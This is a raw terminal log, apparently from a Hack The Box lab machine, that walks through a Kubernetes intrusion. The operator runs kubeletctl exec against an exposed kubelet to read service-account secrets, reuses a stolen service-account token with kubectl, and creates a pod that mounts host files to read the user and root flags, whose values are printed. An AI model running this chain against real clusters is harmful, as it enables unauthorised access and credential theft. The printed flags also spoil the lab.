Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls                                                                                                                                                               1 ⨯
+ca2.crt  ca.crt  kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods 
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# chmod 777 ca.crt                                                                                                                                                 1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─#                                                                                                                                                                  1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─#                                                                                                                                                                  1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token="ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltRllVR1ZuTlVwdGJXUjJiWEphVFdaRWVEZEZVRlZaWjAxMWVqVmpOa2x0TldsTk5rOWlUVXRvUXpBaWZRLmV5SmhkV1FpT2xzaWFIUjBjSE02THk5cmRXSmxjbTVsZEdWekxtUmxabUYxYkhRdWMzWmpMbU5zZFhOMFpYSXViRzlqWVd3aVhTd2laWGh3SWpveE56WXpNalEzTkRZd0xDSnBZWFFpT2pFM016RTNNVEUwTmpBc0ltbHpjeUk2SW1oMGRIQnpPaTh2YTNWaVpYSnVaWFJsY3k1a1pXWmhkV3gwTG5OMll5NWpiSFZ6ZEdWeUxteHZZMkZzSWl3aWEzVmlaWEp1WlhSbGN5NXBieUk2ZXlKdVlXMWxjM0JoWTJVaU9pSmtaV1poZFd4MElpd2ljRzlrSWpwN0ltNWhiV1VpT2lKdVoybHVlQ0lzSW5WcFpDSTZJbUk1TVdObE5EaGxMVGhoWm1FdE5EYzJZeTFpTlRVMkxUSmxPR05qWWprMk9EUTFPQ0o5TENKelpYSjJhV05sWVdOamIzVnVkQ0k2ZXlKdVlXMWxJam9pWkdWbVlYVnNkQ0lzSW5WcFpDSTZJbVJqTkRrellUTmpMVEpoT1dFdE5HRXdOaTA1WW1ReExURTBZek00WVROaU1XWXdPQ0o5TENKM1lYSnVZV1owWlhJaU9qRTNNekUzTVRVd05qZDlMQ0p1WW1ZaU9qRTNNekUzTVRFME5qQXNJbk4xWWlJNkluTjVjM1JsYlRwelpYSjJhV05sWVdOamIzVnVkRHBrWldaaGRXeDBPbVJsWm1GMWJIUWlmUS5tNzJfNzRlUjVKZkdFVTdCS24xZ2N2REJkeGVTNi16OW0ySWtuMjUwc000ck9odEdUN0VpbEJzdmI3ZVQ5TmExX2I4ZHNRREdkdXpNWkx6S3JjZTMycXYwWGM1RFI0R3VkbjZuLW9SYmFEMmxwc3FiLTdCR0VheHlzbkRfNjRmSnlvWmdGbFJ6bXhPNEhRZ3l3dmFXY2NYZlBDTFhGd3BKaUVKTVpXRl9ELXQxVklDTE1JSDFVanVxX2dSVGlNSmswXzBYbnh6djdWSWxwSFRsRTkxUDluT05MZE5UbDZSQUVCenJjb2hLSWZ6aXlYdHFvckdBOXhIRFhlZ2Y2WmpKX1hOQl9nMURhTUNOcURZS1ZBM1ZUQkpHclUwT25tbl95VjVWZkZOcTUzWnhfTG9rVDdTVFFLaVJYeGhKaWZsU29tdWlKMksxWHhLNHhVbkFRUkhza1E="
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token="eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token="eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# export token1="eyJhbGciOiJSUzI1NiIsImtpZCI6ImFYUGVnNUptbWR2bXJaTWZEeDdFUFVZZ011ejVjNkltNWlNNk9iTUtoQzAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYzMjQ3NDYwLCJpYXQiOjE3MzE3MTE0NjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImI5MWNlNDhlLThhZmEtNDc2Yy1iNTU2LTJlOGNjYjk2ODQ1OCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImRjNDkzYTNjLTJhOWEtNGEwNi05YmQxLTE0YzM4YTNiMWYwOCJ9LCJ3YXJuYWZ0ZXIiOjE3MzE3MTUwNjd9LCJuYmYiOjE3MzE3MTE0NjAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.m72_74eR5JfGEU7BKn1gcvDBdxeS6-z9m2Ikn250sM4rOhtGT7EilBsvb7eT9Na1_b8dsQDGduzMZLzKrce32qv0Xc5DR4Gudn6n-oRbaD2lpsqb-7BGEaxysnD_64fJyoZgFlRzmxO4HQgywvaWccXfPCLXFwpJiEJMZWF_D-t1VICLMIH1Ujuq_gRTiMJk0_0Xnxzv7VIlpHTlE91P9nONLdNTl6RAEBzrcohKIfziyXtqorGA9xHDXegf6ZjJ_XNB_g1DaMCNqDYKVA3VTBJGrU0Onmn_yV5VfFNq53Zx_LokT7STQKiRXxhJiflSomuiJ2K1XxK4xUnAQRHskQ"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token1 --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods
+error: unable to load root certificates: unable to parse bytes as PEM block
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubeletctl --token=$token --certificate-authority=ca.crt --server=https://10.129.241.165:8443 get pods                                                           1 ⨯
+Error: unknown command "get" for "kubeletctl"
+Run 'kubeletctl --help' for usage.
+unknown command "get" for "kubeletctl"
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubeletctl --help                                                                                                                                                1 ⨯
+Description:
+  kubeletctl is command line utility that implements kuebelt's API.
+  It also provides scanning for opened kubelet APIs and search for potential RCE on containers.
+  
+  You can view examples from each command by using the -h\--help flag like that: kubeletctl run -h
+  Examples:  
+    // List all pods from kubelet
+    kubeletctl pods --server 123.123.123.123 
+
+    // Searching for service account token in each accessible container
+    kubeletctl scan token --server 123.123.123.123 
+
+    // Searching for pods/containers vulnerable to RCE
+    kubeletctl scan rce --server 123.123.123.123 
+
+    // Run "ls /" command on pod my-nginx-pod/nginx in thedefault namespace
+    kubeletctl run "ls /" --namespace default --pod my-nginx-pod --container nginx --server 123.123.123.123 
+
+    // Run "ls /" command on all existing pods in a node
+    kubeletctl.exe run "ls /" --all-pods --server 123.123.123.123 
+
+    // With certificates
+    kubeletctl.exe pods -s <node_ip> --cacert C:\Users\myuser\certs\ca.crt --cert C:\Users\myuser\certs\kubelet-client-current.pem --key C:\Users\myuser\certs\kubelet-client-current.pem
+
+Usage:
+  kubeletctl [flags]
+  kubeletctl [command]
+
+Available Commands:
+  attach        Attach to a container
+  configz       Return kubelet's configuration.
+  containerLogs Return container log
+  cri           Run commands inside a container through the Container Runtime Interface (CRI)
+  debug         Return debug information (pprof or flags)
+  exec          Run commands inside a container
+  healthz       Check the state of the node
+  help          Help about any command
+  log           Return the log from the node.
+  metrics       Return resource usage metrics (such as container CPU, memory usage, etc.)
+  pods          Get list of pods on the node
+  portForward   Attach to a container
+  run           Run commands inside a container
+  runningpods   Returns all pods running on kubelet from looking at the container runtime cache.
+  scan          Scans for nodes with opened kubelet API
+  spec          Cached MachineInfo returned by cadvisor
+  stats         Return statistical information for the resources in the node.
+  version       Print the version of the kubeletctl
+
+Flags:
+      --cacert string      CA certificate (example: /etc/kubernetes/pki/ca.crt )
+      --cert string        Private key (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+      --cidr string        A network of IP addresses (Example: x.x.x.x/24)
+  -k, --config string      KubeConfig file
+  -c, --container string   Container name
+  -h, --help               help for kubeletctl
+      --http               Use HTTP (default is HTTPS)
+  -i, --ignoreconfig       Ignore the default KUBECONFIG environment variable or location ~/.kube
+      --key string         Digital certificate (example: /var/lib/kubelet/pki/kubelet-client-current.pem)
+  -n, --namespace string   pod namespace
+  -p, --pod string         Pod name
+      --port string        Kubelet's port, default is 10250
+  -r, --raw                Prints raw data
+  -s, --server string      Server address (format: x.x.x.x. For Example: 123.123.123.123)
+  -u, --uid string         Pod UID
+
+Use "kubeletctl [command] --help" for more information about a command.
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 get pods 
+NAME    READY   STATUS    RESTARTS   AGE
+nginx   1/1     Running   0          4h39m
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# cat ca2.crt         
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
+1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
+MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
+BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
+lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
+DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
+9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
+xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
+JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
+kf2eZIBNMp0TFg==
+-----END CERTIFICATE-----
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls              
+ca2.crt  ca.crt  kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls -alh               
+total 18M
+drwxr-xr-x  2 root root 4.0K Nov 15 18:23 .
+drwxr-xr-x 16 root root 4.0K Nov 15 17:21 ..
+-rw-r--r--  1 root root 1.1K Nov 15 18:21 ca2.crt
+-rwxrwxrwx  1 root root  993 Nov 15 18:23 ca.crt
+-rwxr-xr-x  1 root root  18M Nov 15 17:40 kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# chmod 755 ca.crt 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls -alh         
+total 18M
+drwxr-xr-x  2 root root 4.0K Nov 15 18:23 .
+drwxr-xr-x 16 root root 4.0K Nov 15 17:21 ..
+-rw-r--r--  1 root root 1.1K Nov 15 18:21 ca2.crt
+-rwxr-xr-x  1 root root  993 Nov 15 18:23 ca.crt
+-rwxr-xr-x  1 root root  18M Nov 15 17:40 kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# chmod 400 ca.crt
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# 
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls -alh         
+total 18M
+drwxr-xr-x  2 root root 4.0K Nov 15 18:23 .
+drwxr-xr-x 16 root root 4.0K Nov 15 17:21 ..
+-rw-r--r--  1 root root 1.1K Nov 15 18:21 ca2.crt
+-r--------  1 root root  993 Nov 15 18:23 ca.crt
+-rwxr-xr-x  1 root root  18M Nov 15 17:40 kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# chmod 500 ca.crt
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls -alh         
+total 18M
+drwxr-xr-x  2 root root 4.0K Nov 15 18:23 .
+drwxr-xr-x 16 root root 4.0K Nov 15 17:21 ..
+-rw-r--r--  1 root root 1.1K Nov 15 18:21 ca2.crt
+-r-x------  1 root root  993 Nov 15 18:23 ca.crt
+-rwxr-xr-x  1 root root  18M Nov 15 17:40 kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# rm ca.crt                                
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ls     
+ca2.crt  kubeletctl_linux_amd64
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 auth can-i --list                     
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml  
+error: error validating "f.yaml": error validating data: [ValidationError(Pod): unknown field "automountServiceAccountToken" in io.k8s.api.core.v1.Pod, ValidationError(Pod): unknown field "hostnetwork" in io.k8s.api.core.v1.Pod, ValidationError(Pod.spec.containers[1]): unknown field "mountPath" in io.k8s.api.core.v1.Container, ValidationError(Pod): unknown field "volumes" in io.k8s.api.core.v1.Pod]; if you choose to ignore these errors, turn validation off with --validate=false
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml
+error: error parsing f.yaml: error converting YAML to JSON: yaml: line 18: mapping values are not allowed in this context
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml
+error: error parsing f.yaml: error converting YAML to JSON: yaml: line 18: mapping values are not allowed in this context
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml
+error: error validating "f.yaml": error validating data: [ValidationError(Pod): unknown field "automountServiceAccountToken" in io.k8s.api.core.v1.Pod, ValidationError(Pod): unknown field "hostnetwork" in io.k8s.api.core.v1.Pod, ValidationError(Pod.spec.containers[1]): unknown field "mountPath" in io.k8s.api.core.v1.Container]; if you choose to ignore these errors, turn validation off with --validate=false
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml
+error: error validating "f.yaml": error validating data: [ValidationError(Pod): unknown field "automountServiceAccountToken" in io.k8s.api.core.v1.Pod, ValidationError(Pod): unknown field "hostnetwork" in io.k8s.api.core.v1.Pod, ValidationError(Pod.spec.containers[1]): unknown field "mountPath" in io.k8s.api.core.v1.Container]; if you choose to ignore these errors, turn validation off with --validate=false
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml
+error: error validating "f.yaml": error validating data: [ValidationError(Pod): unknown field "automountServiceAccountToken" in io.k8s.api.core.v1.Pod, ValidationError(Pod): unknown field "hostnetwork" in io.k8s.api.core.v1.Pod, ValidationError(Pod.spec.containers[1]): unknown field "mountPath" in io.k8s.api.core.v1.Container]; if you choose to ignore these errors, turn validation off with --validate=false
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml --validate=false                                     1 ⨯
+The Pod "nginxt" is invalid: spec.containers[1].image: Required value
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml --validate=false
+The Pod "nginxt" is invalid: 
+* spec.containers[0].volumeMounts[0].name: Required value
+* spec.containers[0].volumeMounts[0].name: Not found: ""
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# nano f.yaml                                                                                                                                                      1 ⨯
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 apply -f f.yaml --validate=false
+pod/nginxt created
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# kubectl --token=$token --certificate-authority=ca2.crt --server=https://10.129.241.165:8443 get pods                        
+NAME     READY   STATUS    RESTARTS   AGE
+nginx    1/1     Running   0          5h31m
+nginxt   1/1     Running   0          42s
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat /root/home/user/user.txt" -p nginxt -c nginxt
+5b6536b2d397cb2b554105686fee82e6
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# ./kubeletctl_linux_amd64 --server 10.129.241.165 exec "cat /root/root/root.txt" -p nginxt -c nginxt
+38183ef70cd669aaad537d44971e7b1d
+                                                                                                                                                                         
+┌──(root💀kali)-[/home/kali/Desktop/HTB/Steam]
+└─# 
